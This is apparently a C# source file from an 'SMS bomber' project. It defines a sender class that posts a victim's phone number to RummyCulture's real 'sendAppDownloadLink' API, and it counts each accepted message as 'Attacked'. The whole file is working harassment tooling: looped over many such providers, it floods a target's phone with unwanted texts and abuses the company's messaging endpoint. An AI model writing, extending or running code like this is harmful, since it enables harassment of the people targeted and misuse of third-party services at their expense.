using System;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class RummyCulture : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "RummyCulture";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://www.rummyculture.com/api/user/sendAppDownloadLink");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            { Content = new StringContent($"{{\"mobile\":\"{To}\"}}", Encoding.UTF8, "application/json") };

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("{\"success\":true}")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
